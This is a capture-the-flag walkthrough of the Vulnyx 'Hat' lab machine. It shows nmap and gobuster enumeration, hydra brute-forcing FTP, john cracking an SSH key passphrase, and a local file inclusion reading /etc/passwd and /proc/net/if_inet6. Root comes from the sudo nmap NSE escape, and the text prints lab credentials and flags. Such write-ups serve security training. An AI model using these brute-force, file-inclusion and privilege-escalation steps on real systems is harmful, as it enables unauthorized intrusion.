# Vulnyx: Hat

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Medium |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `gobuster` · `hydra` · `ftp` · `ssh2john` · `john` · `ffuf` |
| **Tags** | `#InfoDisclosure` `#BruteForce` `#HashCracking` `#LFI` `#IPv6` `#SudoAbuse` `#GTFOBins` |
| **URL** | https://vulnyx.com/machines/ |

An FTP log left readable over HTTP leaks a valid username, cracked with `hydra` against FTP on a non-standard port. The recovered account holds a passphrase-protected SSH key — and, separately, a Local File Inclusion in `file.php` is used not to read a typical secret, but `/proc/net/if_inet6`, revealing an IPv6 link-local address where SSH is actually reachable. Root comes from a `sudo` rule around `nmap`, using its documented NSE scripting escape.

## Enumeration

### Port Enumeration

A full TCP port scan comes first, with OS detection enabled:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn -O hat.nyx

PORT      STATE SERVICE REASON
80/tcp    open  http    syn-ack ttl 64
65535/tcp open  unknown syn-ack ttl 64
MAC Address: 08:00:27:9D:80:6F (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)
```

The full scan shows just two open ports — **80 (HTTP)** and **65535**, an unusually high, non-standard port — with no SSH in sight over IPv4. A version/script scan (explicitly including 22) confirms it: SSH is `filtered`, and 65535 is FTP:

```bash
$ sudo nmap -p 22,80,65535 -sCV hat.nyx

PORT      STATE    SERVICE VERSION
22/tcp    filtered ssh
80/tcp    open     http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
65535/tcp open     ftp     pyftpdlib 1.5.4
| ftp-syst:
|   STAT:
| FTP server status:
|    Connected to: <IP_Victim>:65535
|    Waiting for username.
|    TYPE: ASCII; STRUcture: File; MODE: Stream
|    Data connection closed.
|_End of status.
MAC Address: 08:00:27:9D:80:6F (Oracle VirtualBox virtual NIC)
```

SSH being filtered rather than closed is a detail worth holding onto — it hints the service exists but isn't reachable the usual way.

### Web Enumeration

```
http://hat.nyx
```

<img src="../Images/hat/Pasted image 20260529172107.png"/>

A directory scan turns up a `logs` directory and a `php-scripts` directory:

```bash
$ gobuster dir -u http://hat.nyx -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
logs                  (Status: 301) [Size: 301] [--> http://hat.nyx/logs/]
php-scripts           (Status: 301) [Size: 308] [--> http://hat.nyx/php-scripts/]
server-status         (Status: 403) [Size: 272]
Progress: 220558 / 220558 (100.00%)
===============================================================
Finished
===============================================================
```

Scanning `/logs/` with common file extensions reveals an FTP log:

```bash
$ gobuster dir -u http://hat.nyx/logs/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt,.log

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html            (Status: 200) [Size: 4]
vsftpd.log            (Status: 200) [Size: 1760]
Progress: 1102790 / 1102790 (100.00%)
===============================================================
Finished
===============================================================
```

## Initial Access

### Loot: An FTP Log Leak

The log file is directly readable over HTTP:

```
http://hat.nyx/logs/vsftpd.log
```

<img src="../Images/hat/Pasted image 20260529172400.png"/>

The log leaks a valid FTP username. It's brute-forced against the FTP service — which, matching the earlier port scan, is running on **65535** rather than the standard port 21:

```bash
$ hydra -l "admin_ftp" -P /usr/share/wordlists/rockyou.txt ftp://hat.nyx -s 65535

[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://hat.nyx:65535/
[65535][ftp] host: hat.nyx   login: admin_ftp   password: cowboy
1 of 1 target successfully completed, 1 valid password found
```

> **Credentials:** `admin_ftp:cowboy`

Logging in over FTP pulls down an SSH private key and a note:

```bash
$ ftp hat.nyx -P 65535
ftp> get id_rsa
ftp> get note
```

```bash
$ cat note
Hi,
We have successfully secured some of our most critical protocols ... no more worrying!
Sysadmin
```

### Cracking the SSH Key Passphrase

The key is passphrase-protected, so its hash is extracted and cracked against `rockyou.txt`:

```bash
$ chmod 600 id_rsa
$ ssh2john id_rsa > id_rsa.hash
$ john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
ilovemyself      (id_rsa)
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

> **Passphrase:** `ilovemyself`

### LFI Discovery

The key alone isn't usable yet — SSH is filtered over IPv4. Separately, `file.php` (found under `/php-scripts/`) is fuzzed for its parameter name:

```bash
$ ffuf -u "http://hat.nyx/php-scripts/file.php?FUZZ=/etc/passwd" -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 0

6                       [Status: 200, Size: 1404, Words: 13, Lines: 27, Duration: 8ms]
```

The parameter turns out to be the single digit `6`. Confirmed directly:

```
view-source:http://hat.nyx/php-scripts/file.php?6=/etc/passwd
```

<img src="../Images/hat/Pasted image 20260529172217.png"/>

### Discovering an IPv6-Only SSH Service

Rather than reading a typical secret, the LFI is pointed at `/proc/net/if_inet6` — the kernel's list of configured IPv6 addresses, in a compact, colon-less hex format:

```
view-source:http://hat.nyx/php-scripts/file.php?6=/proc/net/if_inet6
```

<img src="../Images/hat/Pasted image 20260529172231.png"/>

The first entry is reformatted into standard IPv6 notation — splitting the 32-character hex string into 4-character groups and joining them with colons:

```bash
$ curl -sX GET "http://hat.nyx/php-scripts/file.php?6=/proc/net/if_inet6" | awk 'NR==1 {print $1}' | fold -w4 | paste -sd ":"
fe80:0000:0000:0000:0a00:27ff:fe9d:806f
```

An `nmap` scan over IPv6 confirms SSH is reachable at that address — presumably the *only* place SSH is exposed, which is why this whole detour was necessary in the first place:

```bash
$ sudo nmap -6 -p 22 fe80:0000:0000:0000:0a00:27ff:fe9d:806f | grep "tcp"
22/tcp open  ssh
```

### Shell as cromiphi

Link-local IPv6 addresses need a zone identifier (the network interface) to be usable, since the same address can exist on multiple interfaces:

```bash
$ ssh -i id_rsa -6 cromiphi@'fe80:0000:0000:0000:0a00:27ff:fe9d:806f%eth0'
Enter passphrase for key 'id_rsa':
Linux hat 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64
cromiphi@hat:~$ id
uid=1000(cromiphi) gid=1000(cromiphi) grupos=1000(cromiphi)
cromiphi@hat:~$ ls -l /home/cromiphi/
total 4
-r--------    1 cromiphi cromiphi        33 abr 18  2023 user.txt
cromiphi@hat:~$ cat /home/cromiphi/user.txt
d3ea66f59d9d6ea12351b415080b5457
```

> **User flag:** `d3ea66f59d9d6ea12351b415080b5457`

## Privilege Escalation

### `nmap` NSE Script Execution

```bash
cromiphi@hat:~$ sudo -l
Matching Defaults entries for cromiphi on hat:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cromiphi may run the following commands on hat:
    (root) NOPASSWD: /usr/bin/nmap
```

> **Resource:** `https://gtfobins.github.io/gtfobins/nmap/#inherit`

`nmap`'s scripting engine (NSE) runs Lua scripts, which can call out to `os.execute()` directly. When `nmap` itself runs as root via `sudo`, a crafted script's `os.execute` call runs with that same privilege:

```bash
cromiphi@hat:~$ echo -n 'os.execute("/bin/sh")' > /dev/shm/root.nse
cromiphi@hat:~$ sudo -u root /usr/bin/nmap --script=/dev/shm/root.nse
Starting Nmap 7.70 ( https://nmap.org ) at 2026-05-29 17:02 CEST
# bash -i
```

```bash
root@hat:/home/cromiphi# id
uid=0(root) gid=0(root) grupos=0(root)
root@hat:/home/cromiphi# ls -l /root
total 4
-r--------    1 root     root            33 abr 18  2023 root.txt
root@hat:/home/cromiphi# cat /root/root.txt
8b4acc39c4d068623a16a89ebecd5048
```

> **Root flag:** `8b4acc39c4d068623a16a89ebecd5048`

## Takeaways

- Log files served over HTTP are a common, easy-to-overlook leak — a service's own log (FTP, in this case) can hand over exactly the username needed to make a credential attack targeted instead of blind.
- An LFI isn't limited to reading conventional secrets — `/proc` exposes a huge amount of live system state, and in this case, `/proc/net/if_inet6` revealed network configuration (an IPv6 address) that no other enumeration step surfaced.
- `nmap`'s NSE scripting support is a documented GTFOBins technique for a reason — any `sudo` rule allowing `nmap` at all is equivalent to unrestricted code execution via a custom script.